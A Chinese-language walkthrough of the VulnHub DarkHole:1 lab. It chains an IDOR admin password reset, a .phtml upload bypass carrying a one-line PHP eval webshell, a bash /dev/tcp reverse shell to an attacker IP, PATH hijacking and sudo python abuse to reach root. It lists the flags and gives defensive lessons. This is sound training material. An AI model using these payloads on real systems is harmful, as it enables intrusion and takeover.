# DarkHole:1 靶机通关笔记

> 系列：[[vuln-lab/VulnHub/README|VulnHub 靶场]] | 难度：Easy | 目标：获取 root 权限
> 官方页面：https://www.vulnhub.com/entry/darkhole-1,724/ | 下载 MD5：`19C9D9A6542D363C3185214C90C9D9A3`
> 作者提示：Don't waste your time For Brute-Force（别浪费时间爆破）
> 说明：本文基于社区多个公开 writeup 综合整理（腾讯云原文无法访问），关键结论已交叉核对。

---

## 靶机信息与搭建

| 项 | 值 |
|------|------|
| 靶机 | DarkHole:1（DarkHole.zip，约 2.9GB） |
| 发布日期 | 2021-07-18 |
| 作者 | Jehad Alqurashi |
| 格式 | VirtualBox OVA |
| 难度 | Easy（新手向，但仍需逻辑思考） |
| 网络 | 仅主机网络 / NAT，与 Kali 同网段 |

```bash
# 下载后校验文件完整性（Linux）
md5sum DarkHole.zip
# 期望输出：19C9D9A6542D363C3185214C90C9D9A3

# Windows PowerShell 校验
Get-FileHash -Algorithm MD5 .\DarkHole.zip
```

搭建：导入 OVA 到 VirtualBox，网络模式与攻击机设同一虚拟网段（推荐"仅主机适配器"或"内部网络"），启动后等待自动获取 IP。

---

## 阶段一：信息收集

### 解题步骤

```bash
# 1. 主机发现，找到靶机 IP（假设 192.168.10.128）
arp-scan -l
# 或 nmap -sn 192.168.10.0/24  内网可加-PR参数

# 2. 全端口 + 服务版本扫描
nmap -sS -sV -p- 192.168.10.128
```

扫描结果：仅开放两个端口。

| 端口     | 服务   | 版本特征    |
| ------ | ---- | ------- |
| 22/tcp | SSH  | OpenSSH |
| 80/tcp | HTTP | Apache  |

```bash
# 3. 目录枚举，摸清 web 应用功能面
dirsearch -u http://192.168.10.128
# 或 gobuster dir -u http://192.168.10.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

发现关键路径：

| 路径             | 作用               |
| -------------- | ---------------- |
| /login.php     | 登录页              |
| /register.php  | 注册页              |
| /dashboard.php | 用户面板（带 ?id= 参数）  |
| /upload/       | 上传文件存放目录         |
| /config/       | 配置目录（内容为空，信息价值低） |

> 核心思路：信息收集的目标是建立攻击面清单。端口扫描确定服务面（22/80），目录枚举确定 web 应用的功能面（login/register/dashboard/upload 构成了一条完整的业务链）。注意 /upload/ 这类"非标准入口"往往是后文上传利用的落点。而 /register.php 存在意味着"你可以先拿到一个合法低权限账号"——很多越权漏洞恰好需要这个前提。

---

## 阶段二：初始立足 —— IDOR 水平越权重置 admin 密码

### 解题步骤

```bash
# 1. 注册一个普通账号（register.php），如 test / test123

# 2. 登录后进入 dashboard，URL 出现身份参数
#    http://192.168.10.128/dashboard.php?id=2
#    推测 id=1 是管理员

# 3. 尝试直接把 URL 的 id 改为 1 访问 → 被拦截
#    （个人信息查询有鉴权，提示无权限访问他人信息）
```

绕过拦截的关键在"修改密码"功能：用 Burp 抓取修改密码的 POST 请求，请求体里带 `id` 字段。

```http
POST /change_password.php HTTP/1.1
Host: 192.168.10.128
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<当前会话>

id=2&old_password=test123&new_password=hacked123
```

```bash
# 4. 将 id=2 改为 id=1，提交 → admin 的密码被成功重置为 hacked123

# 5. 用 admin / hacked123 登录 → 获得管理员权限
```

> 核心思路：这是一个典型的水平越权（IDOR，CWE-639）。根本原因是**身份信任边界错误**——"修改密码"这个敏感操作，服务端把"当前用户是谁"的决定权交给了客户端提交的 `id` 参数，而没有用 session 中的身份做校验。为什么改 URL 的 id 会失败、改密码包里的 id 却成功？因为查询个人信息那条接口做了鉴权，而修改密码这条接口漏了——这就是"接口间防护不一致"的常见形态。
>
> 补充：登录处 SQL 注入经多个 writeup 测试（含 sqlmap）均不可用，本靶机入口就是越权逻辑漏洞，不是注入。作者提示词"别浪费时间爆破"正是在引导你不要走弱口令/注入的思路，而是去找业务逻辑问题。

---

## 阶段三：WebShell —— 文件上传黑名单绕过

### 解题步骤

```bash
# 1. admin 面板进入文件上传功能
# 2. 上传 shell.php 被拦截（.php 在黑名单中）
# 3. 将文件改名为 shell.phtml 上传成功
# 4. 上传文件落在 http://192.168.10.128/upload/shell.phtml
```

一句话木马内容：

```php
<?php @eval($_POST['cmd']); ?>
```

```bash
# 5. 用蚁剑（AntSword）连接
#    URL: http://192.168.10.128/upload/shell.phtml
#    连接密码: cmd
#    测试连接成功 → 获得 www-data 权限的 WebShell

# 6. 反弹交互 shell
#    Kali 监听
nc -lvnp 7777

#    AntSword 终端执行
bash -c 'bash -i >& /dev/tcp/192.168.10.130/7777 0>&1'

#    升级为交互式 bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

> 核心思路：黑名单过滤的本质是"枚举所有不允许的东西"，而枚举永远可能遗漏——`.phtml` 不在黑名单里，但 Apache 的解析配置里仍然执行它。这就是黑名单与白名单的根本差异：白名单（只允许 .jpg/.png）是"只放行已知安全"，黑名单是"挡住已知危险"，天然有绕过面。上传点一旦能拿到可执行文件，就等于以 web 服务身份（www-data）执行任意命令，攻击面从"单点"变成"整机"。

---

## 阶段四：提权 john —— PATH 环境变量劫持

### 解题步骤

```bash
# 1. 枚举可登录用户
cat /etc/passwd | grep /bin/bash
# root、darkhole、john 三个用户

# 2. 探查 /home/john（www-data 可读）
cd /home/john
ls -la
# 发现 toto、user.txt、password 等文件；toto 以 john 身份运行，并调用外部命令 id

# 3. 先运行 toto 确认行为
./toto
# 输出类似：uid=1001(john) gid=1001(john) ...（说明它执行了系统的 id 命令，但身份是 john）

# 4. PATH 劫持
cd /tmp
echo "/bin/bash" > id
chmod 777 id
export PATH=/tmp:$PATH
cd /home/john
./toto
# toto 调用 id 时，系统沿 PATH 找到 /tmp/id —— 实为 /bin/bash，以 john 身份执行
# 获得 john 的 shell

# 5. 读取 user flag
cat /home/john/user.txt
# DarkHole{You_Can_DO_It}

# 6. 读取 john 的密码文件
cat /home/john/password
# root123
```

> 核心思路：本质是"特权程序信任了调用者可控的搜索路径"。toto 以 john 身份运行（setuid），内部调用外部命令 `id` 时按 PATH 变量去解析命令位置；把攻击者可控的 /tmp 放到 PATH 最前面，特权程序就会执行我们伪造的同名文件（内容是 /bin/bash），于是我们拿到了 john 的权限。这是"环境变量注入"类提权。关键排查点：程序调用外部命令**是否用绝对路径**——用了绝对路径（如 /usr/bin/id）劫持就无效。

---

## 阶段五：提权 root —— sudo 配置滥用

### 解题步骤

```bash
# 1. 用 john 的密码通过 SSH 登录（此时拥有交互终端更顺手）
ssh john@192.168.10.128
# 密码: root123

# 2. 提权第一动作：审计 sudo 权限
sudo -l
# 输出：(root) NOPASSWD: /usr/bin/python3 /home/john/file.py
# 含义：john 可以免密以 root 身份执行该命令

# 3. 覆写 file.py 为恶意代码（/home/john 对 john 可写）
echo 'import os;os.system("/bin/bash")' > /home/john/file.py

# 4. 以 root 身份触发
sudo /usr/bin/python3 /home/john/file.py
# 获得 root shell

# 5. 读取 root flag
cat /root/root.txt
# DarkHole{You_Are_Legend}
```

> 核心思路：`sudo -l` 审计是提权动作清单里的第一条——sudoers 中任何 NOPASSWD 条目都值得仔细看"允许的命令到底是什么"。这里允许的是一条"用 python3 解释执行 /home/john/file.py"，而 file.py 所在目录对 john 可写：允许的命令本身不可写，但**它运行的那个脚本可写**，于是"运行脚本"变成了"以 root 执行任意 python 代码"。修复方向：sudo 条目应指向不可被普通用户修改的路径，并对脚本做完整性校验。

---

## Flag 汇总

| Flag | 内容 | 位置 | 获取方式 |
|------|------|------|----------|
| user.txt | `DarkHole{You_Can_DO_It}` | /home/john/user.txt | PATH 劫持获得 john shell |
| root.txt | `DarkHole{You_Are_Legend}` | /root/root.txt | sudo 执行 file.py 获得 root |

## 攻击链总览

```
扫描(22/80) → 目录枚举(login/register/dashboard/upload)
→ 注册普通用户 → Burp 改 id 越权重置 admin 密码 → admin 登录
→ .phtml 上传绕过 → 蚁剑 / 反弹 shell(www-data)
→ /home/john/toto 调用外部命令 id → PATH 劫持 → john
→ 读 password(root123) → ssh → sudo -l → NOPASSWD python3 file.py
→ 覆写 file.py → root → /root/root.txt
```

## 经验沉淀

1. 身份标识不能信任客户端参数：密码重置/修改这类敏感操作，必须基于服务端 session 校验"当前用户"，而不是请求里可篡改的 `id`。不同接口防护不一致是越权高发点。
2. 黑名单过滤上传注定可绕过：根本修复是白名单 + 上传目录禁止脚本执行（如 Apache 的 php_admin_flag engine off）。
3. 提权优先查两件事：`sudo -l` 审计 + 查找 SUID/特权程序；当特权程序调用外部命令且不用绝对路径时，PATH 劫持就成立。
4. 作者提示词（Don't brute force）本身是情报：它在引导思路方向——先想逻辑漏洞，别在爆破上耗时间。

## 参考资料

- VulnHub 官方页面：https://www.vulnhub.com/entry/darkhole-1,724/
- cnblogs 题解：https://www.cnblogs.com/C0ngvv/p/15612258.html
- CSDN walkthrough：https://blog.csdn.net/weixin_45168704/article/details/131200655
- juejin 靶场练习：https://juejin.cn/post/7067371641197559845
- 相关漏洞编号：CWE-639（通过用户控制的键访问资源）、CWE-434（不受限制的文件上传）
- 相关技巧笔记：[[vuln-lab/VulnHub/DarkHole-1/payload与技巧提炼|payload与技巧提炼]]
